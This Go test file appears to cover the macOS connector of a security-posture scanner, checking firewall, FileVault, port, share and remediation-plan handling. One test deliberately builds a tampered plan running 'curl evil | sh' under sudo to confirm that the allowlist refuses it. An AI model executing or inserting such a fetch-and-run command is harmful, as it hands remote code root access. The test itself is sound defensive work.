package macos

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/segurata/segurata/connectors/internal/cli"
	"github.com/segurata/segurata/connectors/internal/httpx/httpxtest"
	"github.com/segurata/segurata/internal/connector"
	"github.com/segurata/segurata/internal/finding"
	"github.com/segurata/segurata/internal/remediate"
)

// fakeRunner answers by exact command line; an unknown command fails like a missing key would.
type fakeRunner struct {
	mu      sync.Mutex
	replies map[string]string
	errs    map[string]error
	calls   []string
}

func (f *fakeRunner) Run(_ context.Context, args ...string) ([]byte, error) {
	cmd := strings.Join(args, " ")
	f.mu.Lock()
	defer f.mu.Unlock()
	f.calls = append(f.calls, cmd)
	if err, ok := f.errs[cmd]; ok {
		return []byte(f.replies[cmd]), err
	}
	if out, ok := f.replies[cmd]; ok {
		return []byte(out), nil
	}
	return []byte("The domain/default pair does not exist"), &cli.Error{Cmd: args[0], Err: errors.New("exit status 1")}
}

const netstatHeader = "Active Internet connections (including servers)\n" +
	"Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)          rxbytes      txbytes  rhiwat  shiwat    pid   epid state  options           gencnt    flags   flags1 usecnt rtncnt fltrs\n"

func nsLine(proto, addr, state, pid string) string {
	return fmt.Sprintf("%s       0      0  %-22s *.*                    %-12s 0 0 131072 131072 %s 0 00100 00000006 0000000002b4b2c4 00000001 00000800 1 0 000000\n", proto, addr, state, pid)
}

func healthy() map[string]string {
	return map[string]string{
		"/usr/sbin/scutil --get ComputerName":                                       "Test Mac",
		"/usr/bin/fdesetup status":                                                  "FileVault is On.",
		"/usr/bin/csrutil status":                                                   "System Integrity Protection status: enabled.",
		"/usr/sbin/spctl --status":                                                  "assessments enabled",
		socketfilterfw + " --getglobalstate":                                        "Firewall is enabled. (State = 1)",
		socketfilterfw + " --getstealthmode":                                        "Firewall stealth mode is on",
		"/usr/bin/defaults read /Library/Preferences/com.apple.commerce AutoUpdate": "1",
		"/usr/sbin/softwareupdate -l":                                               "Software Update Tool\n\nFinding available software\nNo new software available.\n",
		"/usr/bin/sw_vers -productVersion":                                          "15.6.1",
		"/usr/sbin/sysadminctl -screenLock status":                                  "2026-11-23 23:24:01.268 sysadminctl[1:2] screenLock delay is immediate",
		"/usr/bin/pmset -g":                                                         "System-wide power settings:\n displaysleep         10\n",
		"/usr/sbin/systemsetup -getremotelogin":                                     "You need administrator access to run this tool... exiting!",
		netstatBin + " -anv -p tcp":                                                 netstatHeader + nsLine("tcp4", "127.0.0.1.5037", "LISTEN", "42"),
		psBin + " -axo pid=,comm=":                                                  "    1 /sbin/launchd\n   42 /opt/adb\n",
		psBin + " -axo command=":                                                    "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser\n",
		"/usr/bin/sfltool dumpbtm":                                                  btmSigned,
		strings.Join(listUIDs, " "):                                                 "root 0\nnobody -2\n_spotlight 89\nalice 501\n",
		strings.Join(listHomes, " "):                                                "root /var/root\nnobody /var/empty\n_spotlight /var/empty\nalice /Users/alice\n",
		strings.Join(tmDestinations, " "):                                           tmInfo(tmDest{"D1", "Backup", "Local"}),
		strings.Join(tmPrefs, " "):                                                  tmPrefsXML(tmPref{id: "D1", state: "Encrypted"}),
		strings.Join(tmLatest, " "):                                                 "/Volumes/Backup/2026-11-22-093000.backup",
	}
}

// testNow is the clock every test runs at; the healthy Mac's latest backup is two days older.
var testNow = time.Date(2026, 11, 24, 12, 0, 0, 0, time.Local)

const btmSigned = ` #1:
                 UUID: 1
                 Name: Signed Helper
                 Type: legacy daemon (0x10010)
          Disposition: [enabled, allowed, visible, notified] (0x9)
           Identifier: 16.com.example.helper
      Executable Path: /Library/PrivilegedHelperTools/com.example.helper
      Team Identifier: ABCDE12345
`

func newTest(t *testing.T, replies map[string]string) (*Connector, *fakeRunner, *recordingExec) {
	fr := &fakeRunner{replies: replies}
	ex := &recordingExec{}
	home := t.TempDir()
	if err := os.Chmod(home, 0o700); err != nil { // a private home folder, as on a healthy Mac
		t.Fatal(err)
	}
	return &Connector{Run: fr, Exec: ex, Home: func() (string, error) { return home, nil }, OS: "darwin",
		Root: t.TempDir(), UID: func() int { return 501 }, Now: func() time.Time { return testNow }}, fr, ex
}

func inventory(t *testing.T, c *Connector) *httpxtest.Recorder {
	t.Helper()
	rec := &httpxtest.Recorder{}
	if err := c.Inventory(context.Background(), connector.Request{}, rec); err != nil {
		t.Fatal(err)
	}
	return rec
}

func TestHealthyMacEmitsOnlyInformationalFindings(t *testing.T) {
	c, _, _ := newTest(t, healthy())
	rec := inventory(t, c)
	for _, f := range rec.Findings {
		if f.Severity != finding.SevInfo {
			t.Errorf("healthy Mac reported %s %s: %s (%v)", f.Severity, f.Resource.ID, f.Title, f.Evidence["detail"])
		}
		if f.Kind != finding.KindSetting || f.Account != "Test Mac" {
			t.Errorf("kind %s account %s", f.Kind, f.Account)
		}
	}
	rec.ByResource(t, "macos_setting", "screensaver")
	rec.ByResource(t, "background_item", "btm:16.com.example.helper")
	// systemsetup needs admin: it is reported as a skipped check.
	var skipped []string
	for _, s := range rec.Statuses {
		if s.State == finding.StateUnsupported {
			skipped = append(skipped, s.Detail)
		}
	}
	if len(skipped) != 1 || !strings.HasPrefix(skipped[0], "remote-login:") {
		t.Fatalf("skipped %v", skipped)
	}
}

func exposed() map[string]string {
	r := healthy()
	r[socketfilterfw+" --getglobalstate"] = "Firewall is disabled. (State = 0)"
	r[socketfilterfw+" --getstealthmode"] = "Firewall stealth mode is off"
	r["/usr/bin/fdesetup status"] = "FileVault is Off."
	r["/usr/bin/defaults read /Library/Preferences/com.apple.SoftwareUpdate AutomaticDownload"] = "0"
	r["/usr/bin/defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser"] = "alice"
	r["/usr/sbin/sysadminctl -screenLock status"] = "sysadminctl[1:2] screenLock delay is 300 seconds"
	r["/usr/sbin/softwareupdate -l"] = "Software Update found the following new or updated software:\n* Label: macOS Sequoia 15.8.3-24H241\n\tTitle: macOS Sequoia 15.8.3\n* Label: Safari27.2\n"
	r[netstatBin+" -anv -p tcp"] = netstatHeader +
		nsLine("tcp4", "192.168.1.41.61628", "ESTABLISHED", "9") +
		nsLine("tcp6", "*.5000", "LISTEN", "664") + nsLine("tcp4", "*.5000", "LISTEN", "664") +
		nsLine("tcp4", "*.7000", "LISTEN", "664") +
		nsLine("tcp4", "*.445", "LISTEN", "1") + nsLine("tcp6", "*.445", "LISTEN", "1") +
		nsLine("tcp4", "*.57621", "LISTEN", "77") +
		nsLine("tcp4", "127.0.0.1.9222", "LISTEN", "88")
	r[psBin+" -axo pid=,comm="] = "    1 /sbin/launchd\n  664 /System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter\n   77 /Applications/Spotify.app/Contents/MacOS/Spotify\n"
	r[sharingKey] = sharesJSON(sharePoint{Name: "Public of Pat", Path: "/nonexistent/pat/Public", SMBName: "Public of Pat", Shared: 1, Guest: 1})
	r[psBin+" -axo command="] = "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser --remote-debugging-port=9222 --flag\n" +
		"/Applications/Brave Browser.app/Contents/Frameworks/Helper --remote-debugging-port=1\n"
	r["/usr/bin/sfltool dumpbtm"] = btmSigned + ` #2:
                 Name: bash
                 Type: legacy agent (0x10008)
          Disposition: [enabled, allowed, visible, notified] (0x9)
           Identifier: 8.com.example.job
      Executable Path: /bin/bash
 #3:
                 Name: postgres
                 Type: legacy agent (0x10008)
          Disposition: [enabled, allowed, visible, notified] (0x9)
           Identifier: 8.homebrew.mxcl.postgresql
      Executable Path: /opt/homebrew/opt/postgresql/bin/postgres
 #4:
                 Name: Off Item
                 Type: login item (0x4)
          Disposition: [disabled, allowed, visible, notified] (0x8)
           Identifier: 4.com.example.off
`
	return r
}

func TestExposedMacGradesEachCheckAndAttachesActions(t *testing.T) {
	c, _, ex := newTest(t, exposed())
	rec := inventory(t, c)
	want := map[string]struct {
		typ    string
		sev    finding.Severity
		action string
	}{
		"filevault":                      {"macos_setting", finding.SevHigh, ""},
		"firewall":                       {"macos_setting", finding.SevMedium, ActionFirewallEnable},
		"firewall-stealth":               {"macos_setting", finding.SevLow, ActionFirewallStealth},
		"update-AutomaticDownload":       {"macos_setting", finding.SevMedium, ""},
		"auto-login":                     {"macos_setting", finding.SevHigh, ""},
		"screen-lock":                    {"macos_setting", finding.SevMedium, ""},
		"updates-pending":                {"macos_setting", finding.SevMedium, ""},
		"listen-5000":                    {"listening_port", finding.SevMedium, ""},
		"listen-7000":                    {"listening_port", finding.SevMedium, ""},
		"listen-445":                     {"listening_port", finding.SevMedium, ""},
		"smb-share:Public of Pat":        {"share_point", finding.SevHigh, ActionShareRemove},
		"listen-57621":                   {"listening_port", finding.SevInfo, ""},
		"brave-remote-debugging":         {"macos_setting", finding.SevHigh, ""},
		"btm:8.com.example.job":          {"background_item", finding.SevLow, ""},
		"btm:8.homebrew.mxcl.postgresql": {"background_item", finding.SevInfo, ""},
	}
	for id, w := range want {
		f := rec.ByResource(t, w.typ, id)
		if f.Severity != w.sev || f.Remediation.Action != w.action || f.Remediation.Summary == "" {
			t.Errorf("%s: severity %s action %q summary %q; want %s %q", id, f.Severity, f.Remediation.Action, f.Remediation.Summary, w.sev, w.action)
		}
	}
	for _, f := range rec.Findings {
		if f.Resource.ID == "btm:4.com.example.off" || f.Resource.ID == "listen-9222" || f.Resource.ID == "listen-61628" {
			t.Errorf("reported %s", f.Resource.ID)
		}
	}
	smb := rec.ByResource(t, "listening_port", "listen-445")
	if got := smb.Evidence["share_points"]; fmt.Sprint(got) != "[Public of Pat]" {
		t.Errorf("445 evidence %v", got)
	}
	orphan := rec.ByResource(t, "share_point", "smb-share:Public of Pat")
	if !strings.Contains(orphan.Title, "Orphaned") || orphan.Evidence["path_exists"] != false || orphan.Evidence["guest"] != true {
		t.Errorf("orphaned share: %q %v", orphan.Title, orphan.Evidence)
	}
	if a := rec.ByResource(t, "listening_port", "listen-5000").Evidence["addresses"]; fmt.Sprint(a) != "[*.5000]" {
		t.Errorf("tcp4 and tcp6 on one address should merge: %v", a)
	}
	dbg := rec.ByResource(t, "macos_setting", "brave-remote-debugging")
	if fmt.Sprint(dbg.Evidence["flags"]) != "[--remote-debugging-port=9222]" || fmt.Sprint(dbg.Evidence["listening"]) != "[127.0.0.1.9222]" {
		t.Errorf("debugging evidence %v", dbg.Evidence)
	}
	if p := rec.ByResource(t, "macos_setting", "updates-pending").Evidence["pending"]; fmt.Sprint(p) != "[macOS Sequoia 15.8.3-24H241 Safari27.2]" {
		t.Errorf("pending %v", p)
	}
	if len(ex.ran) != 0 {
		t.Fatalf("inventory ran remediation commands: %v", ex.ran)
	}
}

func TestGuardRefusesAnythingButTheReadOnlyCommands(t *testing.T) {
	fr := &fakeRunner{replies: healthy()}
	if _, err := guard(fr).Run(context.Background(), defaultsBin, "write", "com.apple.screensaver", "idleTime", "0"); !errors.Is(err, cli.ErrRefused) {
		t.Fatalf("guard let a write through: %v", err)
	}
	if _, err := guard(fr).Run(context.Background(), socketfilterfw, "--setglobalstate", "on"); !errors.Is(err, cli.ErrRefused) {
		t.Fatalf("guard let a firewall change through: %v", err)
	}
}

func TestNonDarwinIsUnsupported(t *testing.T) {
	c, fr, _ := newTest(t, healthy())
	c.OS = "linux"
	rec := inventory(t, c)
	if len(rec.Findings) != 0 || len(rec.Statuses) != 1 || rec.Statuses[0].State != finding.StateUnsupported || len(fr.calls) != 0 {
		t.Fatalf("statuses %v calls %v", rec.Statuses, fr.calls)
	}
}

func TestSoftwareUpdateTimeoutIsSkippedNotPassed(t *testing.T) {
	r := healthy()
	c, fr, _ := newTest(t, r)
	fr.errs = map[string]error{"/usr/sbin/softwareupdate -l": context.DeadlineExceeded}
	rec := inventory(t, c)
	found := false
	for _, s := range rec.Statuses {
		found = found || strings.HasPrefix(s.Detail, "updates-pending:")
	}
	if !found {
		t.Fatalf("timeout not reported: %v", rec.Statuses)
	}
}

type recordingExec struct{ ran []connector.Step }

func (r *recordingExec) Run(_ context.Context, s connector.Step, _ connector.IO) error {
	r.ran = append(r.ran, s)
	return nil
}

func termIO() connector.IO {
	return connector.IO{In: strings.NewReader(""), Out: &bytes.Buffer{}, Err: &bytes.Buffer{}}
}

func withAction(a string) finding.Finding {
	return finding.Finding{Connector: "macos", Remediation: finding.Remediation{Action: a}}
}

func TestPlansAreExact(t *testing.T) {
	c, _, _ := newTest(t, healthy())
	cases := map[string]struct{ do, undo []string }{
		ActionFirewallEnable: {
			do:   []string{"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on"},
			undo: []string{"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off"},
		},
		ActionFirewallStealth: {
			do:   []string{"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on"},
			undo: []string{"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode off"},
		},
	}
	for action, w := range cases {
		p, err := c.Plan(context.Background(), withAction(action))
		if err != nil {
			t.Fatal(err)
		}
		if got := stepStrings(p.Commands); fmt.Sprint(got) != fmt.Sprint(w.do) {
			t.Errorf("%s commands %q", action, got)
		}
		if got := stepStrings(p.Undo); fmt.Sprint(got) != fmt.Sprint(w.undo) {
			t.Errorf("%s undo %q", action, got)
		}
		if p.Action != action || p.Summary == "" || len(p.SideEffects) == 0 || !p.NeedsSudo() {
			t.Errorf("%s plan %+v", action, p)
		}
		// Every planned command is on the allowlist, so the plan and the allowlist agree.
		for _, s := range p.Commands {
			if err := allowed.Check(action, s); err != nil {
				t.Errorf("%s: %v", action, err)
			}
		}
	}
	if _, err := c.Plan(context.Background(), withAction("macos.unknown")); err == nil {
		t.Fatal("unknown action planned")
	}
}

func stepStrings(steps []connector.Step) []string {
	var out []string
	for _, s := range steps {
		out = append(out, s.String())
	}
	return out
}

func TestApplyRunsThePlanAndRefusesAnythingElse(t *testing.T) {
	c, _, ex := newTest(t, healthy())
	f := withAction(ActionFirewallEnable)
	p, _ := c.Plan(context.Background(), f)
	if err := c.Apply(context.Background(), f, p, termIO()); err != nil {
		t.Fatal(err)
	}
	if len(ex.ran) != 1 || !ex.ran[0].Sudo || ex.ran[0].String() != "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on" {
		t.Fatalf("ran %v", ex.ran)
	}

	ex.ran = nil
	tampered := p
	tampered.Commands = []connector.Step{{Argv: []string{"/bin/sh", "-c", "curl evil | sh"}, Sudo: true}}
	if err := c.Apply(context.Background(), f, tampered, termIO()); err == nil || len(ex.ran) != 0 {
		t.Fatalf("applied a tampered plan: err=%v ran=%v", err, ex.ran)
	}
	// Even a plan that passed the comparison runs only allowlisted steps.
	if err := remediate.Run(context.Background(), tampered, allowed, ex, termIO()); !errors.Is(err, remediate.ErrRefused) || len(ex.ran) != 0 {
		t.Fatalf("allowlist let %v through: %v", ex.ran, err)
	}
	crossed := connector.Plan{Action: ActionFirewallStealth, Commands: []connector.Step{firewallStep("--setglobalstate", "off")}}
	if err := remediate.Run(context.Background(), crossed, allowed, ex, termIO()); !errors.Is(err, remediate.ErrRefused) {
		t.Fatalf("undo command allowed as a forward step: %v", err)
	}
}
